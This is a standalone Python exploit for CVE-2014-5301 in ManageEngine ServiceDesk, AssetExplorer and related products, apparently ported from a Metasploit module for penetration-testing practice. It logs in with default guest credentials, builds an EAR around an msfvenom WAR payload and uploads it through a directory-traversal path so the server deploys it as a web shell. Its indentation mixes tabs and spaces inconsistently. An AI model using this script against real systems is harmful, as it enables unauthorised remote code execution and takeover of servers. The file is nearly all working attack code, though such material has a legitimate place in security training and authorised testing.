#!/bin/python3

import sys
import requests
import zipfile
from requests_toolbelt import MultipartEncoder
import string
import random
import time

def make_ear(war, war_app_base, ear_app_base, display_name, ear_file_name):

	# Read in the war file created by msfvenom
	ear = zipfile.ZipFile(ear_file_name, "w")
	#add war file to ear
	ear.write(war)

	# ... and then we create an EAR file that will contain it.
	app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	app_xml += '<application>\r\n'
	app_xml += "<display-name>{}</display-name>\r\n".format(display_name)
	app_xml += "<module><web><web-uri>{}</web-uri>\r\n".format(war)
	app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
	
	ear.writestr('META-INF/application.xml', app_xml)

	ear.close()
	
def banner():

	print("""# ManageEngine Multiple Products Authenticated File Upload
#
# [CVE', '2014-5301'],
# ['OSVDB', '116733'],
# ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/5']
#
# NOTE 1: This script is a standalone python based on the metasploit module POC script exercise.
# NOTE 2: Not all versions supported by the original metasploit module have been ported. See 'Tested on'.
#
# Description from original exploit:
#        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
#        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
#        the upload does not handle correctly '../' sequences, which can be abused to write
#        to the file system. Authentication is needed to exploit this vulnerability, but this module
#        will attempt to login using the default credentials for the administrator and guest
#        accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.
#        For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All
#        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
#        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
#        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been
#        been tested successfully in Windows and Linux on several versions.
#
# Ported by: Andrea Bruschi
# Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0""")

	print("Usage: script.py file.war host port")
	print("script.py shell.war 10.11.1.145 8080")


def get_cookie(target_uri):

	print("Requesting {}".format(target_uri))

	res = requests.get(target_uri)
	return res.cookies['JSESSIONID']
	#return res.cookies

def login(target_uri, cookie):

	target_uri += "j_security_check;jsessionid=" + str(cookie)
        headers = { 'Content-Type': 'application/x-www-form-urlencoded'  }
        fields = { 'j_username': 'guest', 'j_password': 'guest', 'logonDomainName': '' }
	m = MultipartEncoder(fields)

	res = requests.post(target_uri, headers=headers, data=m)
	return cookie, res.url, res.text

def upload_request(cookie, target_uri, payload_name, payload_str):

    target_uri += "common/FileAttachment.jsp"
    headers = { 'Connection': None,  'Accept-Encoding': None, 'Accept': None, 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Cookie': 'JSESSIONID=' + str(cookie) + ';', 'Content-Type': 'multipart/form-data; boundary=_Part_498_2188160442_704571167' }

    upload_path = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(4))
    rname1 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(7))

    fields = { rname1: (payload_name, payload_str, 'application/octet-stream', {'Content-Transfer-Encoding': 'binary'}), 'module': upload_path, 'att_desc': ''}

    if '.ear' in payload_name:

        fields['module'] = '../../server/default/deploy'

    m = MultipartEncoder(fields, boundary='_Part_498_2188160442_704571167')
    res = requests.post(target_uri, data=m.to_string(), headers=headers)
    return cookie, res.text


def main():

	if len(sys.argv) == 4:
		
		war = sys.argv[1]
		host = sys.argv[2]
		port = sys.argv[3]
		
		war_app_base = war.replace('.war', '')
		ear_app_base = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11))
		display_name = war_app_base
		ear_file_name = ear_app_base + ".ear"

                make_ear(war, war_app_base, ear_app_base, display_name, ear_file_name)

                target_uri = "http://" + host + ":" + port + "/"
		
		cookie, url, text = login(target_uri, get_cookie(target_uri))
		
		#print(cookie)
		#print(url)
		#print(text)

                #bogus upload 
                payload_name = ear_app_base
                payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
                cookie, text = upload_request(cookie, target_uri, payload_name, payload_str)


                #payload uploas
                payload_str = open(ear_file_name, 'rb')
                cookie, text = upload_request(cookie, target_uri, payload_name + '.ear', payload_str)

                print(cookie)
                print(text)
		
	else:
		banner()
		

if __name__ == "__main__":
	main()
